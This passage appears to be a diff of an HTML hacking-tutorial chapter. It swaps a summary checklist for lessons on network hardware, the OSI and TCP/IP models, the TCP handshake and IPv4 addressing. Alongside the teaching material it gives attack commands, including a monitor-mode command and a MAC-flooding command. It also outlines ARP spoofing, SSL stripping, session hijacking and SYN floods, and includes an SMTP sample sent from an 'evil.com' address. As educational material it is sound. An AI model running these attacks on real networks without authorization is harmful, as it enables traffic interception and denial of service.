-                    <div style="display: grid; gap: 2rem;">
-                        <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px; border-left: 4px solid #00ccff;">
-                            <h4 style="color: #00ccff; margin: 0 0 1rem 0; font-size: 1.4rem;">The CIA Triad</h4>
-                            <p style="font-size: 1.1rem; line-height: 1.8;">
-                                The three goals of security.
-                                <br><strong>Confidentiality:</strong> Only authorized people can see it. (Encryption).
-                                <br><strong>Integrity:</strong> The data hasn't been changed. (Hashing).
-                                <br><strong>Availability:</strong> The system is up and running. (DDoS protection).
-                            </p>
-                        </div>
-
-                        <div style="background: rgba(0,0,0,0.4); padding: 2rem; border-radius: 10px; border-left: 4px solid #00ff88;">
-                            <h4 style="color: #00ff88; margin: 0 0 1rem 0; font-size: 1.4rem;">AuthN vs AuthZ</h4>
-                            <p style="font-size: 1.1rem; line-height: 1.8;">
-                                <strong>Authentication (AuthN):</strong> "Who are you?" (Password, Fingerprint).
-                                <br><strong>Authorization (AuthZ):</strong> "What are you allowed to do?" (Admin vs User).
-                                <br><em>Broken Access Control</em> (hacking AuthZ) is the #1 vulnerability on the web.
-                            </p>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Mastery Checklist -->
-                <div style="background: linear-gradient(135deg, rgba(0,255,136,0.1) 0%, rgba(138,43,226,0.1) 100%); padding: 3rem; border-radius: 20px; margin: 4rem 0; border: 3px solid rgba(0,255,136,0.3);">
-                    <h2 style="color: #00ff88; font-size: 2rem; margin-bottom: 2rem;">🎯 Chapter 02 Mastery Checklist</h2>
-                    
-                    <div style="display: grid; gap: 1rem;">
-                        <div style="background: rgba(0,0,0,0.4); padding: 1.5rem; border-radius: 10px; font-size: 1.1rem;">
-                            ☐ I know the difference between Public and Private IPs, and what NAT does.
-                        </div>
-                        <div style="background: rgba(0,0,0,0.4); padding: 1.5rem; border-radius: 10px; font-size: 1.1rem;">
-                            ☐ I can identify the parts of a URL and why Query Parameters are dangerous.
-                        </div>
-                        <div style="background: rgba(0,0,0,0.4); padding: 1.5rem; border-radius: 10px; font-size: 1.1rem;">
-                            ☐ I know what <code>/etc/passwd</code> and <code>/var/log</code> are for.
-                        </div>
-                        <div style="background: rgba(0,0,0,0.4); padding: 1.5rem; border-radius: 10px; font-size: 1.1rem;">
-                            ☐ I understand that Base64 is NOT encryption and can be decoded by anyone.
-                        </div>
-                        <div style="background: rgba(0,0,0,0.4); padding: 1.5rem; border-radius: 10px; font-size: 1.1rem;">
-                            ☐ I know the difference between Authentication (Who) and Authorization (What).
-                        </div>
-                    </div>
-                    
-                    <div style="background: rgba(0,255,136,0.2); padding: 2rem; border-radius: 15px; margin-top: 3rem; border: 2px solid rgba(0,255,136,0.5);">
-                        <h3 style="color: #00ff88; margin-top: 0; font-size: 1.6rem;">✅ Level Up!</h3>
-                        <p style="font-size: 1.2rem; line-height: 1.8; margin-bottom: 1rem;">
-                            <strong>Congratulations!</strong> You have just absorbed the core curriculum of a cybersecurity degree. 
-                            This knowledge is the foundation for everything that follows.
-                        </p>
-                        <p style="font-size: 1.15rem; line-height: 1.8;">
-                            <strong style="color: #00ff88;">Next up:</strong> <a href="hacking-ch03.html" style="color: #00ccff; text-decoration: underline;">Chapter 03: Linux Mastery</a>
-                        </p>
-                    </div>
-                </div>
-
-                <div style="display: flex; gap: 2rem; margin-top: 3rem;">
-                    <a href="hacking-ch01.html" style="flex: 1; background: linear-gradient(135deg, rgba(0,204,255,0.2) 0%, rgba(138,43,226,0.2) 100%); padding: 2rem; border-radius: 15px; text-decoration: none; border: 2px solid rgba(0,204,255,0.4); transition: all 0.3s;">
-                        <div style="color: #00ccff; font-size: 0.9rem; margin-bottom: 0.5rem;">← PREVIOUS</div>
-                        <div style="color: #fff; font-size: 1.1rem; font-weight: 600;">Chapter 01</div>
-                    </a>
-                    <a href="hacking-ch03.html" style="flex: 1; background: linear-gradient(135deg, rgba(0,255,136,0.2) 0%, rgba(0,204,255,0.2) 100%); padding: 2rem; border-radius: 15px; text-decoration: none; border: 2px solid rgba(0,255,136,0.4); transition: all 0.3s; text-align: right;">
-                        <div style="color: #00ff88; font-size: 0.9rem; margin-bottom: 0.5rem;">NEXT →</div>
-                        <div style="color: #fff; font-size: 1.1rem; font-weight: 600;">Chapter 03</div>
-                    </a>
+                <div class="card">
+                    <h4>VPN - Virtual Private Network</h4>
+                    <p>Encrypted tunnel through the internet. Makes you appear to be on a different network. Your traffic is encrypted from your device to the VPN server.</p>
+                    <p style="margin-top: 1rem;"><strong>Characteristics:</strong></p>
+                    <ul>
+                        <li>Encrypted tunnel</li>
+                        <li>Masks your real IP</li>
+                        <li>Bypasses geo-restrictions</li>
+                        <li>Can provide anonymity (sort of)</li>
+                    </ul>
+                    <p style="margin-top: 1rem;"><strong>Hacker interest:</strong> VPN bypasses, traffic correlation attacks, VPN provider compromise.</p>
                 </div>
             </div>
+
+            <h3>Network Components Deep Dive</h3>
+            <p>Every network is made of hardware components. Understanding each one helps you understand where attacks can occur:</p>
+
+            <h4>🔌 Network Interface Card (NIC)</h4>
+            <div class="code"># Every device needs a NIC to connect to networks
+# NICs have a unique MAC address burned in at manufacturing
+
+# On Linux, view your NIC:
+ip link show
+# Or older command:
+ifconfig -a
+
+# Example output:
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+      inet 192.168.1.100  netmask 255.255.255.0
+      ether 00:11:22:33:44:55  (this is the MAC address)
+
+# Wireless NICs can be put into "monitor mode" for sniffing:
+airmon-ng start wlan0</div>
+
+            <h4>🔄 Switches</h4>
+            <p>Switches connect devices on a LAN. They're smarter than the old "hubs" - they learn which devices are on which ports and only send traffic where it needs to go.</p>
+            <div class="code"># Switches maintain a MAC address table:
+Port 1 → 00:11:22:33:44:55
+Port 2 → 00:11:22:33:44:56
+Port 3 → 00:11:22:33:44:57
+
+# When a frame arrives for 00:11:22:33:44:56, 
+# the switch sends it ONLY to Port 2
+
+# ATTACK: MAC Flooding
+# Overflow the MAC table with fake entries
+# Switch falls back to "hub mode" - broadcasts everything
+# Now you can sniff all traffic!
+
+macof -i eth0  # Flood switch with random MACs</div>
+
+            <h4>🌐 Routers</h4>
+            <p>Routers connect different networks together. Your home router connects your LAN to your ISP's network (which connects to the internet). Routers make decisions about where to send packets based on IP addresses.</p>
+            <div class="code"># Routers maintain routing tables:
+Destination      Gateway         Interface
+192.168.1.0/24   0.0.0.0         eth0      (directly connected)
+10.0.0.0/8       192.168.1.1     eth0      (via gateway)
+0.0.0.0/0        192.168.1.254   eth0      (default route - the internet)
+
+# View your routing table:
+ip route show       # Linux
+route print         # Windows
+netstat -rn         # macOS/BSD
+
+# ATTACK: Rogue Router
+# Set up your own router on a network
+# Advertise better routes than the real router
+# All traffic comes through you!</div>
+
+            <h4>🛡️ Firewalls</h4>
+            <p>Firewalls filter network traffic based on rules. They can allow/block based on IP addresses, ports, protocols, and more. Understanding firewalls is crucial for both attack and defense.</p>
+            <div class="code"># Firewall types:
+# 1. Packet Filter - examines individual packets
+# 2. Stateful - tracks connection states
+# 3. Application Layer - inspects packet contents
+# 4. Next-Gen (NGFW) - deep packet inspection, IPS, etc.
+
+# Linux iptables example:
+iptables -A INPUT -p tcp --dport 22 -j ACCEPT   # Allow SSH
+iptables -A INPUT -p tcp --dport 80 -j ACCEPT   # Allow HTTP
+iptables -A INPUT -j DROP                        # Block everything else
+
+# ATTACK: Firewall Bypass
+# - Use allowed ports (HTTP/HTTPS)
+# - Tunnel through allowed protocols
+# - Fragment packets
+# - Use IPv6 if only IPv4 is filtered</div>
+
+            <div class="info-box">
+                <h4>Key Takeaway</h4>
+                <p>Every component in a network is a potential attack vector. NICs can be spoofed, switches can be overflowed, routers can be impersonated, and firewalls can be bypassed. The more you understand how they work, the more ways you'll find to exploit them.</p>
+            </div>
+        </section>
+
+        <section id="osi-model" class="section">
+            <h2 class="section-title">The OSI Model: 7 Layers of Networking</h2>
+            <p class="section-intro">The OSI (Open Systems Interconnection) model breaks networking into 7 distinct layers. Each layer has a specific job and communicates only with the layers directly above and below it. This model is <strong>essential knowledge</strong> - it helps you understand where attacks happen and how different parts of the network stack interact.</p>
+
+            <div class="metaphor-box">
+                <h4>📮 The Postal Service Metaphor</h4>
+                <p>Imagine sending an international package. Each layer adds something to ensure delivery:</p>
+                <p style="margin-top: 1rem;"><strong>Layer 7 (Application):</strong> You write a letter (the actual message you want to send)</p>
+                <p><strong>Layer 6 (Presentation):</strong> You translate it to the recipient's language, maybe encrypt it for privacy</p>
+                <p><strong>Layer 5 (Session):</strong> You establish ongoing correspondence - "This is letter 5 in our conversation"</p>
+                <p><strong>Layer 4 (Transport):</strong> You choose express vs regular mail (reliable or fast) and number the pages</p>
+                <p><strong>Layer 3 (Network):</strong> You write the destination city/country (logical routing)</p>
+                <p><strong>Layer 2 (Data Link):</strong> The local post office routes to the right truck (physical addressing)</p>
+                <p><strong>Layer 1 (Physical):</strong> The actual trucks, planes, roads carrying your package (electrical/radio signals)</p>
+                <p style="margin-top: 1rem;">At the destination, each "layer" is removed in reverse order until the original message is revealed!</p>
+            </div>
+
+            <h3>The 7 Layers Explained In Depth</h3>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Layer</th>
+                        <th>Name</th>
+                        <th>Function</th>
+                        <th>Protocols</th>
+                        <th>Attacks</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>7</td>
+                        <td>Application</td>
+                        <td>User-facing services - what apps actually use</td>
+                        <td>HTTP, FTP, SMTP, DNS, SSH</td>
+                        <td>XSS, SQLi, phishing, command injection</td>
+                    </tr>
+                    <tr>
+                        <td>6</td>
+                        <td>Presentation</td>
+                        <td>Data formatting, encryption, compression</td>
+                        <td>SSL/TLS, JPEG, ASCII, encryption</td>
+                        <td>SSL stripping, encoding attacks, POODLE</td>
+                    </tr>
+                    <tr>
+                        <td>5</td>
+                        <td>Session</td>
+                        <td>Manages connections, keeps sessions alive</td>
+                        <td>NetBIOS, RPC, SQL sessions</td>
+                        <td>Session hijacking, session fixation</td>
+                    </tr>
+                    <tr>
+                        <td>4</td>
+                        <td>Transport</td>
+                        <td>End-to-end delivery, error recovery</td>
+                        <td>TCP, UDP</td>
+                        <td>SYN floods, port scanning, UDP floods</td>
+                    </tr>
+                    <tr>
+                        <td>3</td>
+                        <td>Network</td>
+                        <td>Logical addressing and routing</td>
+                        <td>IP, ICMP, IPsec</td>
+                        <td>IP spoofing, ICMP attacks, routing attacks</td>
+                    </tr>
+                    <tr>
+                        <td>2</td>
+                        <td>Data Link</td>
+                        <td>Physical addressing, framing</td>
+                        <td>Ethernet, WiFi (802.11), ARP</td>
+                        <td>ARP spoofing, MAC flooding, VLAN hopping</td>
+                    </tr>
+                    <tr>
+                        <td>1</td>
+                        <td>Physical</td>
+                        <td>Raw bit transmission over physical media</td>
+                        <td>Cables, radio waves, fiber optics</td>
+                        <td>Wiretapping, jamming, physical access</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <div class="info-box">
+                <h4>🧠 Memory Tricks</h4>
+                <p>You MUST memorize the OSI layers. Use these mnemonics:</p>
+                <p style="margin-top: 1rem;"><strong>From Layer 7 to 1:</strong> "<strong>A</strong>ll <strong>P</strong>eople <strong>S</strong>eem <strong>T</strong>o <strong>N</strong>eed <strong>D</strong>ata <strong>P</strong>rocessing"</p>
+                <p><strong>From Layer 1 to 7:</strong> "<strong>P</strong>lease <strong>D</strong>o <strong>N</strong>ot <strong>T</strong>hrow <strong>S</strong>ausage <strong>P</strong>izza <strong>A</strong>way"</p>
+                <p style="margin-top: 1rem;">Or make your own - the important thing is you can recite all 7 layers instantly.</p>
+            </div>
+
+            <h3>Layer 7: Application Layer</h3>
+            <p>This is where humans interact with the network. Every app you use that touches the network operates at Layer 7. Web browsers, email clients, file transfer programs - all Layer 7.</p>
+
+            <div class="code"># Layer 7 Protocols you'll encounter:
+
+# HTTP/HTTPS (80/443) - Web traffic
+GET /index.html HTTP/1.1
+Host: www.example.com
+
+# DNS (53) - Name resolution
+nslookup google.com
+
+# SMTP (25) - Email sending
+MAIL FROM: attacker@evil.com
+RCPT TO: victim@target.com
+
+# FTP (21) - File transfer
+ftp target.com
+USER anonymous
+PASS password
+
+# SSH (22) - Secure shell
+ssh user@target.com</div>
+
+            <div class="warning-box">
+                <h4>Layer 7 Attacks</h4>
+                <p><strong>This is where most vulnerabilities exist.</strong> Web application attacks (SQLi, XSS, CSRF), phishing, credential stuffing, API abuse - all Layer 7. Firewalls at lower layers can't protect against these because the traffic looks "normal."</p>
+            </div>
+
+            <h3>Layer 6: Presentation Layer</h3>
+            <p>The presentation layer handles data formatting. It ensures that data from Layer 7 is in a format that can be transmitted and understood by the receiving system. Encryption happens here!</p>
+
+            <div class="code"># Layer 6 handles:
+# - Encryption/Decryption (SSL/TLS)
+# - Data compression
+# - Character encoding (ASCII, UTF-8)
+# - Data serialization (JSON, XML)
+
+# TLS Handshake (simplified):
+Client: "Hello! I support TLS 1.3, here are my cipher suites"
+Server: "Hello! Let's use TLS 1.3 with AES-256-GCM, here's my cert"
+Client: [Verifies certificate]
+Both:   [Generate session keys using Diffie-Hellman]
+Both:   "All further communication is encrypted!"</div>
+
+            <div class="warning-box">
+                <h4>Layer 6 Attack: SSL Stripping</h4>
+                <p>Attacker intercepts HTTP→HTTPS redirects and keeps the victim on HTTP while connecting to the server via HTTPS. Victim thinks they're secure but attacker sees everything in plaintext!</p>
+                <div class="code" style="margin-top: 1rem;">Victim → [HTTP] → Attacker → [HTTPS] → Server
+# Victim sees http://bank.com
+# Attacker decrypts all traffic</div>
+            </div>
+
+            <h3>Layer 5: Session Layer</h3>
+            <p>The session layer manages connections between applications. It handles authentication, reconnection, and checkpointing for long transfers.</p>
+
+            <div class="code"># Session layer manages:
+# - Session establishment
+# - Session maintenance (keep-alives)
+# - Session termination
+# - Checkpointing (resume interrupted transfers)
+
+# Web sessions use cookies:
+Set-Cookie: session_id=abc123; HttpOnly; Secure
+
+# Session hijacking - if you steal the cookie, you ARE the user
+# Attacker sniffs network traffic
+# Captures session cookie
+# Injects cookie into own browser
+# Now logged in as victim!</div>
+
+            <h3>Layer 4: Transport Layer</h3>
+            <p>The transport layer provides end-to-end communication. This is where TCP and UDP live. The transport layer segments data, handles flow control, and ensures reliability (if using TCP).</p>
+
+            <div class="code"># TCP Header (simplified):
+| Source Port | Destination Port |
+| Sequence Number                 |
+| Acknowledgment Number           |
+| Flags (SYN, ACK, FIN, RST, PSH)|
+| Window Size                     |
+| Checksum                        |
+
+# Flags are crucial for understanding TCP:
+SYN = "I want to start a connection"
+ACK = "I acknowledge your message"
+FIN = "I want to close the connection"
+RST = "Something's wrong, abort!"
+PSH = "Send this data immediately"
+
+# Common Layer 4 attacks:
+# SYN Flood - exhaust connection table
+# Port Scanning - discover open services
+# UDP Flood - overwhelm with UDP traffic</div>
+
+            <h3>Layer 3: Network Layer</h3>
+            <p>The network layer handles logical addressing (IP addresses) and routing. This is where packets are routed across different networks to reach their destination.</p>
+
+            <div class="code"># IP Header (simplified):
+| Version | Header Length | Type of Service |
+| Total Length                              |
+| Identification | Flags | Fragment Offset |
+| TTL | Protocol | Header Checksum         |
+| Source IP Address                         |
+| Destination IP Address                    |
+
+# TTL (Time To Live):
+# Each router decrements TTL by 1
+# When TTL = 0, packet is dropped
+# Prevents infinite routing loops
+# Traceroute exploits this!
+
+traceroute google.com
+# Sends packets with TTL=1, 2, 3, etc.
+# Each router sends back "TTL exceeded"
+# Maps the entire route!</div>
+
+            <h3>Layer 2: Data Link Layer</h3>
+            <p>The data link layer handles physical addressing (MAC addresses) and framing. This is where ARP operates, making it the target of many local network attacks.</p>
+
+            <div class="code"># Ethernet Frame:
+| Preamble | Dest MAC | Source MAC | Type | Data | FCS |
+
+# MAC Address format:
+00:11:22:33:44:55
+# First 3 bytes = Manufacturer (OUI)
+# Last 3 bytes = Unique device ID
+
+# ARP (Address Resolution Protocol):
+# Maps IP addresses to MAC addresses
+
+# ARP Request (broadcast):
+"Who has 192.168.1.1? Tell 192.168.1.100"
+
+# ARP Reply:
+"192.168.1.1 is at AA:BB:CC:DD:EE:FF"
+
+# ARP SPOOFING - The classic MITM attack
+# Attacker sends fake ARP replies
+# "192.168.1.1 (gateway) is at [ATTACKER MAC]"
+# "192.168.1.100 (victim) is at [ATTACKER MAC]"
+# All traffic flows through attacker!</div>
+
+            <h3>Layer 1: Physical Layer</h3>
+            <p>The physical layer is actual hardware - cables, radio waves, electrical signals, light pulses in fiber optics. No logical processing happens here, just raw bit transmission.</p>
+
+            <div class="card-grid">
+                <div class="card">
+                    <h4>Copper Cables</h4>
+                    <p>Ethernet cables (Cat5e, Cat6). Electrical signals over twisted pairs. Susceptible to electromagnetic interference and wiretapping.</p>
+                </div>
+                <div class="card">
+                    <h4>Fiber Optics</h4>
+                    <p>Light pulses through glass. Extremely fast, immune to EMI, very hard to tap without detection.</p>
+                </div>
+                <div class="card">
+                    <h4>Wireless (Radio)</h4>
+                    <p>Radio waves through air. Most vulnerable - anyone in range can capture signals. Encryption essential!</p>
+                </div>
+                <div class="card">
+                    <h4>Coaxial Cable</h4>
+                    <p>Older technology, still used for cable internet and some LANs. More resistant to interference than twisted pair.</p>
+                </div>
+            </div>
+
+            <div class="metaphor-box">
+                <h4>🔍 Why OSI Matters for Hacking</h4>
+                <p>When you understand OSI layers, you can:</p>
+                <ul style="margin-top: 1rem;">
+                    <li>Identify which layer an attack targets</li>
+                    <li>Understand why certain defenses work (or don't)</li>
+                    <li>Know which tools to use for different attack types</li>
+                    <li>Communicate precisely with other security professionals</li>
+                    <li>Debug network issues systematically</li>
+                </ul>
+                <p style="margin-top: 1rem;">"The firewall blocked my attack" → Which layer? A packet filter stops Layer 3/4. A WAF stops Layer 7. Different bypasses needed!</p>
+            </div>
+        </section>
+
+        <section id="tcp-ip" class="section">
+            <h2 class="section-title">TCP/IP: How Data Actually Travels</h2>
+            <p class="section-intro">While OSI is a theoretical model, TCP/IP is what the internet <strong>actually uses</strong>. It's a 4-layer model that governs all internet communication. Understanding TCP/IP at a deep level is essential for network hacking - every scan, every exploit, every packet you craft uses TCP/IP.</p>
+
+            <div class="metaphor-box">
+                <h4>📦 The Package Delivery Metaphor</h4>
+                <p>When you order something online, it goes through a process similar to TCP/IP:</p>
+                <ul style="margin-top: 1rem;">
+                    <li><strong>Application Layer:</strong> You browse a website and click "buy" (the application handles your request)</li>
+                    <li><strong>Transport Layer:</strong> The warehouse packs your order, labels it with tracking info, splits large orders into multiple boxes</li>
+                    <li><strong>Internet Layer:</strong> Each box gets a shipping address and is routed through the postal system</li>
+                    <li><strong>Network Access:</strong> The actual trucks, planes, and delivery drivers moving your packages</li>
+                </ul>
+            </div>
+
+            <h3>TCP/IP vs OSI Comparison</h3>
+            <table>
+                <thead>
+                    <tr>
+                        <th>TCP/IP Layer</th>
+                        <th>OSI Equivalent</th>
+                        <th>Protocols</th>
+                        <th>Function</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>Application</td>
+                        <td>Layers 5, 6, 7</td>
+                        <td>HTTP, FTP, SMTP, DNS, SSH</td>
+                        <td>User-facing protocols and data formatting</td>
+                    </tr>
+                    <tr>
+                        <td>Transport</td>
+                        <td>Layer 4</td>
+                        <td>TCP, UDP</td>
+                        <td>End-to-end communication, reliability</td>
+                    </tr>
+                    <tr>
+                        <td>Internet</td>
+                        <td>Layer 3</td>
+                        <td>IP, ICMP, ARP (sort of)</td>
+                        <td>Logical addressing, routing</td>
+                    </tr>
+                    <tr>
+                        <td>Network Access</td>
+                        <td>Layers 1, 2</td>
+                        <td>Ethernet, WiFi</td>
+                        <td>Physical transmission and framing</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>TCP vs UDP: The Two Transport Protocols</h3>
+            <p>At the transport layer, you have two choices: TCP (reliable but slower) or UDP (fast but unreliable). Understanding when each is used helps you understand network traffic.</p>
+
+            <div class="card-grid">
+                <div class="card">
+                    <h4>TCP - Transmission Control Protocol</h4>
+                    <p><strong>Connection-oriented, reliable delivery.</strong> Guarantees packets arrive in order. If one is lost, it's retransmitted.</p>
+                    <p style="margin-top: 1rem;"><strong>Uses:</strong></p>
+                    <ul>
+                        <li>Web browsing (HTTP/HTTPS)</li>
+                        <li>Email (SMTP, IMAP, POP3)</li>
+                        <li>File transfer (FTP, SFTP)</li>
+                        <li>Remote access (SSH, Telnet)</li>
+                        <li>Anything that can't lose data</li>
+                    </ul>
+                    <p style="margin-top: 1rem;"><strong>Trade-off:</strong> Slower due to handshakes, acknowledgments, and retransmissions. More overhead.</p>
+                </div>
+                <div class="card">
+                    <h4>UDP - User Datagram Protocol</h4>
+                    <p><strong>Connectionless, unreliable.</strong> No guarantee packets arrive, no guarantee they're in order. "Fire and forget."</p>
+                    <p style="margin-top: 1rem;"><strong>Uses:</strong></p>
+                    <ul>
+                        <li>Video streaming (lost frame? skip it)</li>
+                        <li>Online gaming (speed > perfection)</li>
+                        <li>DNS queries (small, single packet)</li>
+                        <li>VoIP calls (real-time audio)</li>
+                        <li>Anything where speed matters more</li>
+                    </ul>
+                    <p style="margin-top: 1rem;"><strong>Trade-off:</strong> No reliability. Packets can be lost, duplicated, or arrive out of order.</p>
+                </div>
+            </div>
+
+            <h3>The TCP Three-Way Handshake</h3>
+            <p>Before TCP can send any data, it must establish a connection. This is the famous "three-way handshake" - you'll see this pattern everywhere in networking.</p>
+
+            <div class="code">CLIENT                                           SERVER
+   |                                                |
+   |  ---- SYN (seq=100) ----------------------->   |  Step 1: Client initiates
+   |       "Hey, I want to talk"                    |          (sends SYN flag)
+   |                                                |
+   |  <--- SYN-ACK (seq=300, ack=101) -----------   |  Step 2: Server acknowledges
+   |       "OK, I'm listening, go ahead"            |          (sends SYN + ACK)
+   |                                                |
+   |  ---- ACK (ack=301) ----------------------->   |  Step 3: Client confirms
+   |       "Great, let's begin"                     |          (sends ACK)
+   |                                                |
+   |  ========== CONNECTION ESTABLISHED ==========  |
+   |                                                |
+   |  ---- DATA: "GET /index.html" ------------->   |  Now data can flow!
+   |  <--- ACK --------------------------------     |  Server acknowledges receipt
+   |  <--- DATA: "HTTP/1.1 200 OK..." ----------    |  Server sends response
+   |  ---- ACK -------------------------------->    |  Client acknowledges
+   |                                                |
+
+# Why sequence numbers?
+# They track which bytes have been sent/received
+# If packet 3 is lost, server says "I'm missing 3!"
+# Client retransmits ONLY packet 3
+
+# Flag meanings:
+SYN = "Synchronize" - I want to start a connection
+ACK = "Acknowledge" - I received your message
+FIN = "Finish" - I want to close the connection
+RST = "Reset" - Something's wrong, abort everything
+PSH = "Push" - Send this data immediately, don't buffer</div>
+
+            <h3>TCP Connection Termination</h3>
+            <div class="code">CLIENT                                           SERVER
+   |                                                |
+   |  ---- FIN (seq=500) ----------------------->   |  Step 1: Client wants to close
+   |                                                |
+   |  <--- ACK (ack=501) -----------------------    |  Step 2: Server acknowledges
+   |                                                |
+   |  <--- FIN (seq=700) -----------------------    |  Step 3: Server also closes
+   |                                                |
+   |  ---- ACK (ack=701) ----------------------->   |  Step 4: Client confirms
+   |                                                |
+   |  ============ CONNECTION CLOSED =============  |
+
+# This is a "graceful" close
+# Both sides agree to terminate
+# RST flag = "hard" close - something went wrong</div>
+
+            <div class="warning-box">
+                <h4>🔥 SYN Flood Attack (Classic DoS)</h4>
+                <p>Attackers exploit the handshake by sending thousands of SYN packets but <strong>never completing the handshake</strong>. The server allocates resources for each half-open connection, waiting for ACKs that never come.</p>
+                <div class="code" style="margin-top: 1rem;"># Attack flow:
+Attacker → SYN → Server    # Server allocates memory, waits
+Attacker → SYN → Server    # More memory, more waiting
+Attacker → SYN → Server    # Even more...
+[10,000 more SYN packets]
+Server: "I can't accept any more connections!"
+
+# Legitimate users can't connect because:
+# - Connection table is full
+# - Memory exhausted
+# - CPU busy processing fake connections
+
+# Defense: SYN cookies
+# Server doesn't allocate resources until handshake completes
+# Uses cryptographic cookies in sequence numbers</div>
+            </div>
+
+            <h3>Understanding Packet Structure</h3>
+            <p>Every packet on the network has headers from multiple layers stacked together. Understanding this structure is crucial for packet crafting and analysis.</p>
+
+            <div class="code"># Complete packet structure (Ethernet + IP + TCP + Data):
+
+ETHERNET HEADER (14 bytes)
+├── Destination MAC (6 bytes)
+├── Source MAC (6 bytes)
+└── EtherType (2 bytes) → 0x0800 = IPv4
+
+IP HEADER (20+ bytes)
+├── Version (4 bits) → 4 = IPv4
+├── Header Length (4 bits)
+├── Type of Service (1 byte)
+├── Total Length (2 bytes)
+├── Identification (2 bytes)
+├── Flags + Fragment Offset (2 bytes)
+├── TTL - Time To Live (1 byte)
+├── Protocol (1 byte) → 6 = TCP, 17 = UDP
+├── Header Checksum (2 bytes)
+├── Source IP (4 bytes)
+└── Destination IP (4 bytes)
+
+TCP HEADER (20+ bytes)
+├── Source Port (2 bytes)
+├── Destination Port (2 bytes)
+├── Sequence Number (4 bytes)
+├── Acknowledgment Number (4 bytes)
+├── Data Offset + Flags (2 bytes)
+├── Window Size (2 bytes)
+├── Checksum (2 bytes)
+└── Urgent Pointer (2 bytes)
+
+DATA PAYLOAD
+└── Your actual data (HTTP request, file, etc.)</div>
+
+            <h3>Wireshark: Seeing Packets in Action</h3>
+            <p>Wireshark lets you capture and analyze network traffic. Here's how to see the three-way handshake in real life:</p>
+
+            <div class="code"># Start Wireshark, capture on your interface
+# Filter for TCP handshakes:
+tcp.flags.syn == 1
+
+# You'll see packets like:
+No.  Time     Source         Destination    Info
+1    0.0000   192.168.1.100  93.184.216.34  [SYN] Seq=0
+2    0.0234   93.184.216.34  192.168.1.100  [SYN, ACK] Seq=0 Ack=1
+3    0.0235   192.168.1.100  93.184.216.34  [ACK] Seq=1 Ack=1
+
+# Filter for HTTP traffic:
+http
+
+# Filter for specific host:
+ip.host == google.com
+
+# Filter for specific port:
+tcp.port == 443
+
+# Follow a TCP stream (reconstructs the full conversation):
+Right-click packet → Follow → TCP Stream</div>
+
+            <div class="info-box">
+                <h4>Practical Exercise</h4>
+                <p>Open Wireshark, start capturing, then open a website in your browser. Watch the handshake happen in real-time. See the SYN, SYN-ACK, ACK, then the HTTP request/response. This will cement your understanding!</p>
+            </div>
+
+            <h3>TCP State Machine</h3>
+            <p>TCP connections move through various states. Understanding these helps you understand port scan results and connection issues:</p>
+
+            <div class="code"># TCP Connection States:
+
+LISTEN       # Server waiting for connections (port is "open")
+SYN-SENT     # Client sent SYN, waiting for response
+SYN-RECEIVED # Server received SYN, sent SYN-ACK
+ESTABLISHED  # Connection is active, data can flow
+FIN-WAIT-1   # Client sent FIN, waiting for ACK
+FIN-WAIT-2   # Client received ACK, waiting for server's FIN
+TIME-WAIT    # Waiting before fully closing
+CLOSE-WAIT   # Server received FIN, sending remaining data
+LAST-ACK     # Server sent FIN, waiting for final ACK
+CLOSED       # Connection is fully closed
+
+# View active connections:
+netstat -an        # All connections, numeric addresses
+ss -tunap          # Linux - socket statistics</div>
+        </section>
+
+        <section id="ip-addresses" class="section">
+            <h2 class="section-title">IP Addresses: The Internet's Addressing System</h2>
+            <p class="section-intro">Every device on a network needs a unique address so other devices know where to send data. IP addresses are those addresses - they're the fundamental way the internet routes traffic from source to destination. As a hacker, you'll work with IP addresses constantly - scanning them, spoofing them, tracing them, and exploiting them.</p>
+
+            <div class="metaphor-box">
+                <h4>🏠 The Postal Address Metaphor</h4>
+                <p>IP addresses are like mailing addresses for computers:</p>
+                <ul style="margin-top: 1rem;">
+                    <li><strong>Country</strong> = The first part of the IP identifies the large network block</li>
+                    <li><strong>City</strong> = The next part narrows down to a regional network</li>
+                    <li><strong>Street</strong> = Further narrows to a specific subnet</li>
+                    <li><strong>House Number</strong> = The final part identifies the specific device</li>
+                </ul>
+                <p style="margin-top: 1rem;">Just like mail travels from country → city → street → house, packets travel from large network → smaller network → subnet → device!</p>
+            </div>
+
+            <h3>IPv4 Addresses</h3>
+            <p>IPv4 is the original internet addressing system. It uses 32 bits to create addresses, giving us about 4.3 billion possible addresses (which we've run out of!).</p>
+
+            <div class="code"># IPv4 format: Four numbers (0-255) separated by dots
+192.168.1.100
+
+# Each number is called an "octet" (8 bits = 1 byte)
+# Total: 4 octets × 8 bits = 32 bits
+
+# Breaking down into binary:
+192     = 11000000  (128 + 64 = 192)
+168     = 10101000  (128 + 32 + 8 = 168)
+1       = 00000001  (1)
+100     = 01100100  (64 + 32 + 4 = 100)
+
+# Full binary: 11000000.10101000.00000001.01100100
+
+# Total possible IPv4 addresses:
+2^32 = 4,294,967,296 (about 4.3 billion)
+
+# Problem: Earth has 8 billion people with multiple devices each
+# We've completely run out of IPv4 addresses!
+# Solutions: NAT, CGNAT, and IPv6</div>
+
+            <h3>IP Address Classes (Historical)</h3>
+            <p>Originally, IP addresses were divided into classes. While classful networking is obsolete, you'll still hear these terms:</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Class</th>
+                        <th>First Octet Range</th>
+                        <th>Default Mask</th>
+                        <th>Networks</th>
+                        <th>Hosts/Network</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>A</td>
+                        <td>1-126</td>
+                        <td>255.0.0.0 (/8)</td>
+                        <td>128</td>
+                        <td>16+ million</td>
+                    </tr>
+                    <tr>
+                        <td>B</td>
+                        <td>128-191</td>
+                        <td>255.255.0.0 (/16)</td>
+                        <td>16,384</td>
+                        <td>65,534</td>
+                    </tr>
+                    <tr>
+                        <td>C</td>
+                        <td>192-223</td>
+                        <td>255.255.255.0 (/24)</td>
+                        <td>2+ million</td>
+                        <td>254</td>
+                    </tr>
+                    <tr>
+                        <td>D</td>
+                        <td>224-239</td>
+                        <td>N/A</td>
+                        <td>Multicast</td>
